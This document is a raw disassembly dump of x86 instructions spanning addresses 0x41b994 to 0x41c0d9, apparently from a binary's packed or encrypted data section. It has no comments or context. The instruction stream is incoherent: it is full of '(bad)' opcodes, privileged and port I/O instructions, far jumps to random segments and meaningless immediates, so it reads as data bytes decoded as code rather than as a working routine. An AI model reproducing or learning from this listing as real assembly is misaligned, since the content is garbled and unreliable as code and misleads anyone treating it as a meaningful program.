  41b994:	addr16 clc 
  41b996:	int    0xc8
  41b998:	aaa    
  41b999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b99a:	jmp    0x41b9c4
  41b99c:	hlt    
  41b99d:	inc    edi
  41b99e:	xor    eax,0x114ece36
  41b9a3:	xor    esp,DWORD PTR [ebx-0x12]
  41b9a6:	pop    edx
  41b9a7:	fadd   QWORD PTR [esp+esi*8]
  41b9aa:	fisub  DWORD PTR [esi]
  41b9ac:	push   eax
  41b9ad:	jge    0x41b952
  41b9af:	cmp    dl,bh
  41b9b1:	and    al,0xe
  41b9b3:	mov    al,ds:0xfef58c06
  41b9b8:	inc    edi
  41b9b9:	or     eax,DWORD PTR [ebx-0x23ed8a17]
  41b9bf:	sbb    ecx,DWORD PTR [edi+esi*1-0x13ac89c5]
  41b9c6:	fsubr  st,st(3)
  41b9c8:	arpl   WORD PTR [edx],bx
  41b9ca:	js     0x41b993
  41b9cc:	cmc    
  41b9cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9ce:	outs   dx,DWORD PTR ds:[esi]
  41b9cf:	sub    al,0x21
  41b9d1:	retf   0x236b
  41b9d4:	and    al,0x7b
  41b9d6:	mov    ebp,DWORD PTR [esi+0x43a74f5b]
  41b9dc:	mov    al,0x5e
  41b9de:	and    bh,BYTE PTR cs:[eax+0x46]
  41b9e2:	push   edx
  41b9e3:	xchg   ebp,eax
  41b9e4:	mov    cl,0xc4
  41b9e6:	ret    0xd3ce
  41b9e9:	jo     0x41b9f5
  41b9eb:	ins    BYTE PTR es:[edi],dx
  41b9ec:	mov    cs,WORD PTR [esi]
  41b9ee:	and    ah,BYTE PTR [edi]
  41b9f0:	idiv   BYTE PTR [bp+si-0x14]
  41b9f4:	mov    edi,esi
  41b9f6:	aaa    
  41b9f7:	(bad)  
  41b9f8:	xlat   BYTE PTR ds:[ebx]
  41b9f9:	ds sub eax,0xeb609884
  41b9ff:	mov    esi,0x32330c5a
  41ba04:	rcr    DWORD PTR [edi+eiz*2-0x17d64306],1
  41ba0b:	rcr    BYTE PTR [edi],1
  41ba0d:	in     eax,0xa9
  41ba0f:	push   0x58706a6d
  41ba14:	inc    ebp
  41ba15:	pop    ecx
  41ba16:	push   eax
  41ba17:	mov    edi,0x221d260c
  41ba1c:	sub    dl,BYTE PTR [ebx]
  41ba1e:	aas    
  41ba1f:	in     al,dx
  41ba20:	pop    esi
  41ba21:	mov    al,ds:0x22765d0f
  41ba26:	cmp    DWORD PTR [edi-0x592873c4],0xc3f8fa56
  41ba30:	mov    bl,0x2d
  41ba32:	inc    edi
  41ba33:	leave  
  41ba34:	mov    gs,ebx
  41ba36:	mov    ecx,0xa5d0de5a
  41ba3b:	fimul  WORD PTR [esi-0x3a013297]
  41ba41:	hlt    
  41ba42:	sub    esp,DWORD PTR [esi]
  41ba44:	xchg   ebp,eax
  41ba45:	mov    ?,ebp
  41ba47:	xchg   ebx,eax
  41ba48:	mov    ebx,0x59677124
  41ba4d:	mov    esp,cr4
  41ba50:	push   edx
  41ba51:	ret    0xfeb
  41ba54:	ins    DWORD PTR es:[edi],dx
  41ba55:	stos   BYTE PTR es:[edi],al
  41ba56:	sahf   
  41ba57:	mov    DWORD PTR [ecx-0x65],eax
  41ba5a:	inc    edx
  41ba5b:	or     BYTE PTR [eax],bl
  41ba5d:	sti    
  41ba5e:	shr    ebp,cl
  41ba60:	ret    0x54c9
  41ba63:	popf   
  41ba64:	jmp    FWORD PTR [esi]
  41ba66:	dec    esp
  41ba67:	jbe    0x41badb
  41ba69:	nop
  41ba6a:	and    eax,0xf9949b74
  41ba6f:	fcomi  st,st(7)
  41ba71:	mov    ch,0x77
  41ba73:	dec    esp
  41ba74:	imul   ebx,ebp,0xe0fc39dc
  41ba7a:	popa   
  41ba7b:	pop    DWORD PTR [eax-0x42]
  41ba7e:	sub    eax,0x39ce4afd
  41ba83:	sbb    bl,bl
  41ba85:	adc    esp,DWORD PTR [ebx]
  41ba87:	rol    BYTE PTR [edx+ebx*4+0x74d6ec09],1
  41ba8e:	mov    esi,0xdf195f97
  41ba93:	pop    ss
  41ba94:	pop    ecx
  41ba95:	xor    esp,DWORD PTR [eax+0x5]
  41ba98:	xchg   ebx,eax
  41ba99:	test   al,0x17
  41ba9b:	inc    ecx
  41ba9c:	les    ebp,FWORD PTR [ebx]
  41ba9e:	mov    edx,0x11c95fcd
  41baa3:	push   esi
  41baa4:	imul   esi,DWORD PTR [ecx-0x7e6780a9],0xb1afbf93
  41baae:	data16 test al,0x37
  41bab1:	add    al,0x4c
  41bab3:	mov    ebp,0x2804f464
  41bab8:	imul   esp,DWORD PTR [ecx+0x782bee09],0xa
  41babf:	mov    ebx,0x692a6e69
  41bac4:	jle    0x41bb03
  41bac6:	in     eax,0xbd
  41bac8:	repnz mov esp,DWORD PTR [edx]
  41bacb:	fcomp  QWORD PTR [esi-0x42e606f9]
  41bad1:	xchg   edi,eax
  41bad2:	es dec ecx
  41bad4:	stc    
  41bad5:	and    DWORD PTR ds:0x35a267a6,esp
  41badb:	sti    
  41badc:	adc    al,0x19
  41bade:	push   esi
  41badf:	push   ss
  41bae0:	aas    
  41bae1:	add    edi,DWORD PTR [edx-0x317f7e98]
  41bae7:	gs jge 0x41baa9
  41baea:	or     ebp,ebx
  41baec:	pop    ebx
  41baed:	jne    0x41ba70
  41baef:	xchg   ebp,eax
  41baf0:	and    al,0x44
  41baf2:	mul    dh
  41baf4:	scas   al,BYTE PTR es:[edi]
  41baf5:	aad    0xc
  41baf7:	cwde   
  41baf8:	jno    0x41ba94
  41bafa:	jg     0x41bb59
  41bafc:	push   ebp
  41bafd:	jl     0x41bacd
  41baff:	pop    ebp
  41bb00:	lock add BYTE PTR [ebx],ch
  41bb03:	mov    dl,0x95
  41bb05:	sti    
  41bb06:	xchg   edx,eax
  41bb07:	jmp    0x41baaa
  41bb09:	pusha  
  41bb0a:	xor    edi,DWORD PTR [ebx]
  41bb0c:	mov    eax,0x8b727ea4
  41bb11:	xchg   esp,eax
  41bb12:	push   ds
  41bb13:	lods   eax,DWORD PTR ds:[esi]
  41bb14:	inc    eax
  41bb15:	inc    ebx
  41bb16:	in     al,dx
  41bb17:	mov    al,0xe5
  41bb19:	sbb    dl,BYTE PTR ds:0xb958d2fd
  41bb1f:	push   0x5217372
  41bb24:	mov    cl,0x9e
  41bb26:	sub    al,0x27
  41bb29:	cmp    bh,dl
  41bb2b:	das    
  41bb2c:	mov    ch,0x72
  41bb2e:	repz sub DWORD PTR ds:0x254f0c5d,0xffffffd2
  41bb36:	shl    BYTE PTR [ecx],0x88
  41bb39:	pushf  
  41bb3a:	rol    esi,1
  41bb3c:	div    DWORD PTR [eax-0x5d]
  41bb3f:	(bad)  
  41bb40:	ja     0x41bb5b
  41bb42:	mov    ebx,0x23732f85
  41bb47:	cdq    
  41bb48:	push   esi
  41bb49:	scas   eax,DWORD PTR es:[edi]
  41bb4a:	mov    dh,0x2a
  41bb4c:	repz jbe 0x41bb58
  41bb4f:	jo     0x41bbb6
  41bb51:	sbb    al,0x28
  41bb53:	mov    cs:0x141e7068,eax
  41bb59:	pushf  
  41bb5a:	jae    0x41bae7
  41bb5c:	push   es
  41bb5d:	sbb    esp,DWORD PTR [edx]
  41bb5f:	xchg   esi,eax
  41bb60:	cmc    
  41bb61:	cmp    al,0xbe
  41bb63:	bound  ecx,QWORD PTR [esi+0x3f22fc78]
  41bb69:	adc    ecx,DWORD PTR [esi-0xf]
  41bb6c:	or     ebx,DWORD PTR [ebx-0x4d]
  41bb6f:	push   ss
  41bb70:	jge    0x41bb25
  41bb72:	nop
  41bb73:	jbe    0x41bb4a
  41bb75:	(bad)
  41bb79:	and    eax,0x55e9232b
  41bb7e:	cdq    
  41bb7f:	mov    bh,bl
  41bb81:	lods   al,BYTE PTR ds:[esi]
  41bb82:	push   0xa76661b0
  41bb87:	jns    0x41bbd4
  41bb89:	into   
  41bb8a:	sub    al,0x8f
  41bb8c:	rcl    BYTE PTR [edi-0x57],0xa6
  41bb90:	js     0x41bb9d
  41bb92:	sbb    esi,DWORD PTR [ecx+0x26]
  41bb95:	in     eax,dx
  41bb96:	pop    eax
  41bb97:	and    ebp,ecx
  41bb99:	cli    
  41bb9a:	(bad)  
  41bb9b:	in     al,0x26
  41bb9d:	fst    DWORD PTR [edx-0x6e]
  41bba0:	sub    esi,edi
  41bba2:	and    BYTE PTR [ebp-0x51fd6c92],0xc5
  41bba9:	dec    edi
  41bbaa:	adc    BYTE PTR [edx+0x37c7c1b7],bl
  41bbb0:	aaa    
  41bbb1:	cli    
  41bbb2:	jno    0x41bbba
  41bbb4:	dec    esp
  41bbb5:	jle    0x41bb5f
  41bbb7:	inc    edx
  41bbb8:	(bad)  
  41bbb9:	jbe    0x41bb8e
  41bbbb:	addr16 jno 0x41bc38
  41bbbe:	retf   0x6fb8
  41bbc1:	push   ecx
  41bbc2:	push   ss
  41bbc3:	mov    bh,0xef
  41bbc5:	mov    eax,0x82cd21cf
  41bbca:	sub    eax,0xe225edb2
  41bbcf:	pop    edx
  41bbd0:	pop    esp
  41bbd1:	adc    al,0xa7
  41bbd3:	cmp    ecx,ecx
  41bbd5:	jge    0x41bbdb
  41bbd7:	inc    ebp
  41bbd8:	fnstcw WORD PTR [ebx-0x4b]
  41bbdb:	ins    BYTE PTR es:[edi],dx
  41bbdc:	pusha  
  41bbdd:	or     DWORD PTR [ebx],edi
  41bbdf:	mov    ah,0x82
  41bbe1:	push   edx
  41bbe2:	stos   BYTE PTR es:[edi],al
  41bbe3:	scas   eax,DWORD PTR es:[edi]
  41bbe4:	adc    al,0x8d
  41bbe6:	pop    edx
  41bbe7:	(bad)  
  41bbe8:	jb     0xcd998fec
  41bbee:	js     0x41bbda
  41bbf0:	sbb    BYTE PTR [ebx-0x46],al
  41bbf3:	repnz or DWORD PTR [ecx-0x52],0xffffffdd
  41bbf8:	push   ss
  41bbf9:	test   eax,0xff24d03c
  41bbfe:	and    eax,0xe4642c88
  41bc03:	xchg   ecx,eax
  41bc04:	ds int 0x53
  41bc07:	xchg   edx,eax
  41bc08:	call   0x4f65:0xdc094095
  41bc0f:	jp     0x41bc69
  41bc11:	xor    al,0x36
  41bc13:	jmp    0x51f0:0x8cd2cedd
  41bc1a:	call   0x85fb:0xc8bf64a3
  41bc21:	and    BYTE PTR [edi+0x62bd400a],ah
  41bc27:	push   ebp
  41bc28:	dec    ecx
  41bc29:	dec    edx
  41bc2a:	push   0xffffff9f
  41bc2c:	mov    ds:0xf0d645d3,al
  41bc31:	test   eax,0xb48d01fc
  41bc36:	sub    eax,0x1a584be3
  41bc3b:	outs   dx,DWORD PTR ds:[esi]
  41bc3c:	or     DWORD PTR [esi],ebx
  41bc3e:	popa   
  41bc3f:	fiadd  WORD PTR [edx+0x2d]
  41bc42:	cld    
  41bc43:	mov    ch,0x16
  41bc45:	dec    ebp
  41bc46:	lea    edi,[edi-0x4dfa717a]
  41bc4c:	mov    al,0x30
  41bc4e:	cmp    ebx,DWORD PTR [edx+eiz*8+0xc]
  41bc52:	jmp    0x12ed2d1a
  41bc57:	pop    esp
  41bc58:	icebp  
  41bc59:	jns    0x41bbe0
  41bc5b:	loopne 0x41bcce
  41bc5d:	aad    0x4b
  41bc5f:	xor    esp,DWORD PTR [eax+0x7e]
  41bc62:	or     dl,ch
  41bc64:	dec    ebx
  41bc65:	or     esi,DWORD PTR ds:0xa0a64c16
  41bc6b:	in     eax,dx
  41bc6c:	mov    ecx,0x10c8a3f9
  41bc71:	pop    ebp
  41bc72:	retf   0x620b
  41bc75:	mov    ecx,0x35c84b94
  41bc7a:	pop    eax
  41bc7b:	es jb  0x41bc6b
  41bc7e:	pusha  
  41bc7f:	ror    edx,0x79
  41bc82:	add    edi,DWORD PTR [ebx*4+0x3a72a42d]
  41bc89:	lods   eax,DWORD PTR ds:[esi]
  41bc8a:	lahf   
  41bc8b:	push   edx
  41bc8c:	xchg   esp,eax
  41bc8d:	pop    edx
  41bc8e:	add    esp,ecx
  41bc90:	neg    DWORD PTR [ecx-0x4c]
  41bc93:	shl    DWORD PTR [esi+0x7fe714fd],0x24
  41bc9a:	jmp    0x9384:0xe049efcc
  41bca1:	xchg   ebx,eax
  41bca2:	push   edi
  41bca3:	jge    0x41bc61
  41bca5:	or     ebp,DWORD PTR [esi]
  41bca7:	daa    
  41bca8:	(bad)
  41bcab:	pop    ds
  41bcac:	push   edi
  41bcad:	test   eax,0xa7bdd84a
  41bcb2:	xor    eax,0xb5f4b560
  41bcb7:	jecxz  0x41bc5b
  41bcb9:	jmp    0xe8a0a297
  41bcbe:	in     al,0xf3
  41bcc0:	and    al,0x8c
  41bcc2:	push   eax
  41bcc3:	adc    dl,al
  41bcc5:	cmp    eax,0xa81b0731
  41bcca:	inc    esp
  41bccb:	sub    al,0x92
  41bccd:	add    edi,DWORD PTR [eax+0x36]
  41bcd0:	call   0x24e95757
  41bcd5:	stc    
  41bcd6:	jnp    0x41bcc1
  41bcd8:	jbe    0x41bc8f
  41bcda:	xchg   ecx,eax
  41bcdb:	adc    bh,BYTE PTR [ebx]
  41bcdd:	adc    ebx,DWORD PTR [esp+edi*1]
  41bce0:	lods   eax,DWORD PTR ds:[esi]
  41bce1:	ins    BYTE PTR es:[edi],dx
  41bce2:	inc    esp
  41bce3:	out    0x45,eax
  41bce5:	pop    esp
  41bce6:	inc    edi
  41bce7:	jno    0x41bd19
  41bce9:	cmp    BYTE PTR [ecx-0xa],ch
  41bcec:	jns    0x41bd17
  41bcee:	and    al,0x33
  41bcf0:	aad    0x6b
  41bcf2:	lods   al,BYTE PTR ds:[esi]
  41bcf3:	pop    ecx
  41bcf4:	retf   0xff49
  41bcf7:	iret   
  41bcf8:	and    BYTE PTR [edx+0x10fe6341],dh
  41bcfe:	dec    eax
  41bcff:	sub    cl,BYTE PTR [eax-0x1a10cccf]
  41bd05:	outs   dx,BYTE PTR ds:[esi]
  41bd06:	add    cl,BYTE PTR [esi-0x7c]
  41bd09:	mov    BYTE PTR [ebx],al
  41bd0b:	loop   0x41bd34
  41bd0d:	mov    al,0x4
  41bd0f:	mov    ebp,0x81425bb8
  41bd14:	retf   0xa198
  41bd17:	jmp    0x41bd1e
  41bd19:	xchg   ecx,eax
  41bd1a:	lds    edi,FWORD PTR [edx+0x7c]
  41bd1d:	pop    ecx
  41bd1e:	dec    edi
  41bd1f:	neg    BYTE PTR [eax]
  41bd21:	mov    ecx,0x5401471c
  41bd26:	daa    
  41bd27:	sub    al,0xbe
  41bd29:	jg     0x41bcd8
  41bd2b:	or     DWORD PTR [eax],eax
  41bd2d:	push   ds
  41bd2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd2f:	out    dx,al
  41bd30:	or     bh,BYTE PTR [ecx+0x114888d8]
  41bd36:	nop
  41bd37:	fistp  WORD PTR [ebx+0x13]
  41bd3a:	mov    cl,0xc3
  41bd3c:	or     ecx,0x26
  41bd3f:	mov    ?,edi
  41bd41:	dec    edx
  41bd42:	mov    DWORD PTR [ecx+0x27],ecx
  41bd45:	mov    al,0x8b
  41bd47:	pop    ebx
  41bd48:	add    al,0x80
  41bd4a:	pop    es
  41bd4b:	ins    DWORD PTR es:[edi],dx
  41bd4c:	cmc    
  41bd4d:	push   ebx
  41bd4e:	scas   eax,DWORD PTR es:[edi]
  41bd4f:	sbb    ebp,ebp
  41bd51:	jbe    0x41bd41
  41bd53:	dec    esp
  41bd54:	xor    ebx,edx
  41bd56:	push   ss
  41bd57:	mov    ecx,0x71d0fcf6
  41bd5c:	icebp  
  41bd5d:	or     al,0x8d
  41bd5f:	ins    BYTE PTR es:[edi],dx
  41bd60:	push   esp
  41bd61:	fbld   TBYTE PTR [edx-0x25059ecd]
  41bd67:	aam    0xf
  41bd69:	jecxz  0x41bd32
  41bd6b:	(bad)  
  41bd6c:	scas   eax,DWORD PTR es:[edi]
  41bd6d:	js     0x41bde6
  41bd6f:	lods   al,BYTE PTR ds:[esi]
  41bd70:	and    dl,dh
  41bd72:	pop    ss
  41bd73:	in     al,dx
  41bd74:	out    0xd2,eax
  41bd76:	cwde   
  41bd77:	mov    ?,WORD PTR [edx+ebx*4-0x17]
  41bd7b:	lods   eax,DWORD PTR ds:[esi]
  41bd7c:	test   BYTE PTR [edx+edi*1-0x223a6291],bh
  41bd83:	outs   dx,BYTE PTR ds:[esi]
  41bd84:	add    ebx,DWORD PTR [ecx+0x7d]
  41bd87:	or     eax,0xef89dbc8
  41bd8c:	aad    0xf5
  41bd8e:	mov    cl,0xfb
  41bd90:	xor    dh,BYTE PTR [eax+ebx*4+0x4e85e9bb]
  41bd97:	(bad)  
  41bd99:	dec    edi
  41bd9a:	dec    edx
  41bd9b:	call   0x4a89657b
  41bda0:	data16 jb 0x41be0e
  41bda3:	pop    ecx
  41bda4:	aas    
  41bda5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bda6:	bnd ret 0x9263
  41bdaa:	iret   
  41bdab:	and    cl,BYTE PTR [eax+0x3b]
  41bdae:	mov    eax,ds:0x92b4a0a
  41bdb3:	cwde   
  41bdb4:	xchg   ecx,eax
  41bdb5:	out    0x95,eax
  41bdb7:	mov    bh,0xf0
  41bdb9:	dec    ecx
  41bdba:	(bad)  
  41bdbb:	shr    DWORD PTR [edi],1
  41bdbd:	jmp    0x41bd6b
  41bdbf:	sub    DWORD PTR [eax+0xc],ebp
  41bdc2:	test   cl,ch
  41bdc4:	dec    esp
  41bdc5:	scas   al,BYTE PTR es:[edi]
  41bdc6:	les    esi,FWORD PTR [esi]
  41bdc8:	push   esi
  41bdc9:	add    al,0x61
  41bdcb:	push   ebx
  41bdcc:	loop   0x41bdaa
  41bdce:	and    eax,esi
  41bdd0:	cmp    edx,DWORD PTR [edi+0x5af3a636]
  41bdd6:	bound  eax,QWORD PTR [ebx]
  41bdd8:	std    
  41bdd9:	pusha  
  41bdda:	rcl    dh,1
  41bddc:	mov    esi,0x1278ff77
  41bde1:	out    0x21,eax
  41bde3:	stos   BYTE PTR es:[edi],al
  41bde4:	in     al,0xbe
  41bde6:	ins    DWORD PTR es:[edi],dx
  41bde7:	sahf   
  41bde8:	mov    gs,WORD PTR [eax-0x16795b95]
  41bdee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdef:	cwde   
  41bdf0:	pop    ecx
  41bdf1:	das    
  41bdf2:	stos   BYTE PTR es:[edi],al
  41bdf3:	shr    BYTE PTR [eax-0x566fa3cf],1
  41bdf9:	or     DWORD PTR [eax],esp
  41bdfb:	mov    ebx,ecx
  41bdfd:	fadd   QWORD PTR [ebp-0x43fbf436]
  41be03:	fnsave ds:0xe74d2cb3
  41be09:	fwait
  41be0a:	sbb    bh,bh
  41be0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be0d:	popf   
  41be0e:	inc    eax
  41be0f:	out    0x93,al
  41be11:	rcl    DWORD PTR [ebp-0x57d28f3d],0x66
  41be18:	and    dl,BYTE PTR [eax+0x50]
  41be1b:	ins    BYTE PTR es:[edi],dx
  41be1c:	test   BYTE PTR [ebx-0x634b7485],dl
  41be22:	inc    edi
  41be23:	nop
  41be24:	jl     0x41be7d
  41be26:	fwait
  41be27:	cmc    
  41be28:	out    0x6f,al
  41be2a:	xlat   BYTE PTR ds:[ebx]
  41be2b:	cmc    
  41be2c:	(bad)  
  41be2e:	jmp    0x41be4f
  41be30:	sti    
  41be31:	call   DWORD PTR [ebx]
  41be33:	data16 fs jle 0x41be61
  41be37:	mov    bh,0x75
  41be39:	sbb    BYTE PTR [esi+0x14],cl
  41be3c:	adc    dl,dh
  41be3e:	repnz stos DWORD PTR es:[edi],eax
  41be40:	cmp    al,0xee
  41be42:	pop    edx
  41be43:	fmul   QWORD PTR [eax]
  41be45:	push   0xffffffa1
  41be47:	(bad)
  41be4b:	pusha  
  41be4c:	adc    edi,DWORD PTR [esi]
  41be4e:	and    ecx,DWORD PTR [edi]
  41be50:	sub    DWORD PTR [edx+0x34],esi
  41be53:	cmp    cl,BYTE PTR [esi+0x11]
  41be56:	cs push edi
  41be58:	je     0x41be9d
  41be5a:	rcr    BYTE PTR [esi+0x4c9f63e7],1
  41be60:	test   eax,0xb8643d4b
  41be65:	lock and eax,0xa5cab0fd
  41be6b:	inc    BYTE PTR [edx+0x56d894f6]
  41be71:	stc    
  41be72:	in     eax,dx
  41be73:	pop    ecx
  41be74:	xor    cl,dl
  41be76:	add    DWORD PTR [ecx],ebx
  41be78:	inc    esp
  41be79:	sbb    ah,cl
  41be7b:	xlat   BYTE PTR ds:[ebx]
  41be7c:	pushf  
  41be7d:	jno    0x41bedc
  41be7f:	and    al,BYTE PTR [edi-0x30687fe3]
  41be85:	inc    edi
  41be86:	ins    DWORD PTR es:[edi],dx
  41be87:	clc    
  41be88:	lods   al,BYTE PTR ds:[esi]
  41be89:	(bad)  
  41be8a:	xor    ebx,eax
  41be8c:	data16 fs arpl sp,bx
  41be90:	mov    edi,0x85ece86a
  41be95:	outs   dx,BYTE PTR ds:[esi]
  41be96:	add    dh,ah
  41be98:	fldenv [edx+ecx*4]
  41be9b:	and    DWORD PTR [ebp-0x1ee19fb7],esp
  41bea1:	ins    BYTE PTR es:[edi],dx
  41bea2:	pop    es
  41bea3:	push   es
  41bea4:	push   0xbb157716
  41bea9:	out    0xe2,eax
  41beab:	(bad)  
  41beac:	rcl    DWORD PTR [edi+0x53],cl
  41beaf:	bound  edx,QWORD PTR [ebx+0x265679b2]
  41beb5:	pop    ecx
  41beb6:	push   esi
  41beb7:	std    
  41beb8:	in     al,0x3
  41beba:	icebp  
  41bebb:	xor    DWORD PTR [eax],edx
  41bebd:	int3   
  41bebe:	ja     0x41bea8
  41bec0:	in     al,dx
  41bec1:	mov    esi,0xc842de7b
  41bec6:	in     al,dx
  41bec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bec8:	push   edx
  41bec9:	ss out dx,al
  41becb:	call   0xbeca:0xc795e77d
  41bed2:	dec    eax
  41bed3:	jmp    0x8bc3ff67
  41bed8:	xchg   edi,eax
  41bed9:	sti    
  41beda:	jg     0x41bf1f
  41bedc:	sti    
  41bedd:	repz jp 0x41beb4
  41bee0:	mov    WORD PTR [edi],cs
  41bee2:	and    ebx,DWORD PTR [eax+0x33]
  41bee5:	jbe    0x41be7a
  41bee7:	push   0x7bd7fffb
  41beec:	ds dec ebp
  41beee:	cmp    eax,0x1734076
  41bef3:	sub    DWORD PTR [esi-0x42],0xac870fbb
  41befa:	sbb    eax,0x90804669
  41beff:	xor    DWORD PTR [eax-0x127287d9],esi
  41bf05:	fs data16 sti 
  41bf08:	or     dl,BYTE PTR [eax-0x73af29ea]
  41bf0e:	mov    eax,ds:0xdcf2999e
  41bf13:	add    cl,ah
  41bf15:	sub    ecx,ebx
  41bf17:	sbb    dh,BYTE PTR [ebp-0x67927d60]
  41bf1d:	cld    
  41bf1e:	sbb    al,0x83
  41bf20:	ds pop ds
  41bf22:	xor    ebx,DWORD PTR [edx+ebx*2-0x3a]
  41bf26:	pop    ds
  41bf27:	xchg   ebx,eax
  41bf28:	hlt    
  41bf29:	imul   edi,DWORD PTR [edi+0x5897072c],0x58f3e28f
  41bf33:	rcl    esi,1
  41bf35:	inc    eax
  41bf36:	xor    edx,DWORD PTR [esi-0x73]
  41bf39:	jo     0x41bf86
  41bf3b:	dec    edx
  41bf3c:	ds neg eax
  41bf3f:	pop    edx
  41bf40:	jno    0x41bf65
  41bf42:	mov    esi,DWORD PTR [ebx+0x37e85346]
  41bf48:	push   eax
  41bf49:	lock nop
  41bf4b:	ret    
  41bf4c:	push   ss
  41bf4d:	sbb    DWORD PTR [edx-0x1f],0xffffff87
  41bf51:	shl    DWORD PTR [ebx+0x73],1
  41bf54:	mov    al,BYTE PTR [esi+0x6b553d1b]
  41bf5a:	and    dl,cl
  41bf5c:	aas    
  41bf5d:	adc    dh,BYTE PTR [esi+0x25e0204a]
  41bf63:	dec    edi
  41bf64:	retf   0x92a0
  41bf67:	dec    esp
  41bf68:	outs   dx,DWORD PTR ds:[esi]
  41bf69:	xchg   edi,eax
  41bf6a:	in     al,0x80
  41bf6c:	sub    al,0x3
  41bf6e:	inc    ecx
  41bf6f:	jecxz  0x41bfe9
  41bf71:	dec    eax
  41bf72:	cmc    
  41bf73:	inc    edi
  41bf74:	xor    ebp,eax
  41bf76:	hlt    
  41bf77:	push   esi
  41bf78:	adc    bh,al
  41bf7a:	push   ebp
  41bf7b:	retf   0xec22
  41bf7e:	imul   ebp,DWORD PTR [ebp+0x7f93a932],0x72f2c59a
  41bf88:	jns    0x41bf74
  41bf8a:	sub    BYTE PTR [ebp-0x209bf609],bl
  41bf90:	cdq    
  41bf91:	inc    edi
  41bf92:	adc    DWORD PTR [eax+ecx*4-0x2b],edi
  41bf96:	mov    edi,DWORD PTR [esi-0x46]
  41bf99:	call   0x2d665a73
  41bf9e:	mov    dl,BYTE PTR [ebx-0x5d9fd7e8]
  41bfa4:	dec    ebp
  41bfa5:	repnz add DWORD PTR [edx-0x7f],esp
  41bfa9:	popa   
  41bfaa:	or     eax,0x8f93bedc
  41bfaf:	scas   eax,DWORD PTR es:[edi]
  41bfb0:	aam    0x7d
  41bfb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfb3:	loope  0x41bfdd
  41bfb5:	imul   edx,DWORD PTR [ebp-0x62],0x459ce387
  41bfbc:	jecxz  0x41bf79
  41bfbe:	cli    
  41bfbf:	sbb    bh,BYTE PTR [esi+0x474b5fe1]
  41bfc5:	cld    
  41bfc6:	dec    esi
  41bfc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfc8:	aaa    
  41bfc9:	push   es
  41bfca:	js     0x41bfe4
  41bfcc:	lea    ebx,[ebx]
  41bfce:	cmp    BYTE PTR [ebp-0x24e15d27],al
  41bfd4:	fild   QWORD PTR [edx]
  41bfd6:	inc    DWORD PTR [ebx-0x65]
  41bfd9:	adc    cl,BYTE PTR [edi+eax*1+0x4d]
  41bfdd:	pop    edi
  41bfde:	xchg   edx,eax
  41bfdf:	xor    bl,cl
  41bfe1:	test   eax,0x74c37b39
  41bfe6:	inc    esi
  41bfe7:	hlt    
  41bfe8:	loop   0x41bf77
  41bfea:	jmp    0x14a15fe5
  41bfef:	test   eax,0x8fa05652
  41bff4:	loopne 0x41bfda
  41bff6:	ficom  WORD PTR [edi+0x313dd200]
  41bffc:	and    eax,0xd1b20476
  41c001:	lods   al,BYTE PTR ds:[esi]
  41c002:	lahf   
  41c003:	div    DWORD PTR [ebx]
  41c005:	mov    al,0xd
  41c007:	lds    ebp,FWORD PTR ds:0x302149df
  41c00d:	xchg   ecx,eax
  41c00e:	adc    bl,bl
  41c010:	mov    edx,DWORD PTR [esi]
  41c012:	loope  0x41c053
  41c014:	push   cs
  41c015:	sub    BYTE PTR [esi],0x3d
  41c018:	adc    ecx,DWORD PTR [edx+eax*4]
  41c01b:	sbb    ebp,DWORD PTR [edx+0x62f3337f]
  41c021:	pop    es
  41c022:	(bad)  
  41c024:	mov    BYTE PTR [eax],ah
  41c026:	cmc    
  41c027:	cld    
  41c028:	lds    edi,FWORD PTR ds:0x4e725beb
  41c02e:	jno    0x41c081
  41c030:	add    al,0xfa
  41c032:	push   esi
  41c033:	xchg   edx,eax
  41c034:	jg     0x41c095
  41c036:	lods   eax,DWORD PTR ds:[esi]
  41c037:	loope  0x41c052
  41c039:	xor    ecx,DWORD PTR [ebx+eax*2-0x6]
  41c03d:	xor    DWORD PTR [ecx+0xacec966],eax
  41c043:	add    BYTE PTR [edx+0x79],dh
  41c046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c047:	sub    al,0x9a
  41c049:	imul   ebp,DWORD PTR [eax-0x30579d33],0x72f72915
  41c053:	xchg   dl,ch
  41c055:	mov    ds:0xfa657efb,al
  41c05a:	sbb    DWORD PTR [ecx-0x3a],eax
  41c05d:	call   0xa07c:0xefdb919c
  41c064:	sbb    bh,BYTE PTR [edi]
  41c066:	adc    BYTE PTR [ebp-0x3],ah
  41c069:	out    0x72,al
  41c06b:	call   0xfa1770b6
  41c070:	in     eax,dx
  41c071:	test   eax,0xdf88c81c
  41c076:	cs push ds
  41c078:	cmp    al,0x7e
  41c07a:	fst    st(5)
  41c07c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c07d:	add    eax,0xd00a1183
  41c082:	jg     0x41c021
  41c084:	imul   BYTE PTR [ecx-0x76]
  41c087:	xlat   BYTE PTR ds:[ebx]
  41c088:	lea    edi,fs:[edx+ecx*1]
  41c08c:	repz xor eax,eax
  41c08f:	jl     0x41c037
  41c091:	xor    BYTE PTR ds:0xcc7f5c9d,bl
  41c097:	or     al,0x2e
  41c099:	jp     0x41c0f5
  41c09b:	dec    edi
  41c09c:	push   eax
  41c09d:	dec    edx
  41c09e:	cmp    al,0x88
  41c0a0:	pop    ecx
  41c0a1:	push   eax
  41c0a2:	shl    DWORD PTR [ecx-0x1cf1b5d5],1
  41c0a8:	add    dh,BYTE PTR [edx-0x3df99c37]
  41c0ae:	adc    BYTE PTR [ebp+0x5ea252fd],0xf4
  41c0b5:	(bad)
  41c0b9:	mov    eax,ds:0xa24fee4d
  41c0be:	xchg   ch,bh
  41c0c0:	and    eax,0xfedca4ae
  41c0c5:	pop    edi
  41c0c6:	add    DWORD PTR [ecx+edi*8-0x15f7a081],edi
  41c0cd:	int    0x59
  41c0cf:	sub    DWORD PTR [edi-0x79316d55],ecx
  41c0d5:	or     al,0x9c
  41c0d7:	mov    ch,0x70
  41c0d9:	arpl   sp,di
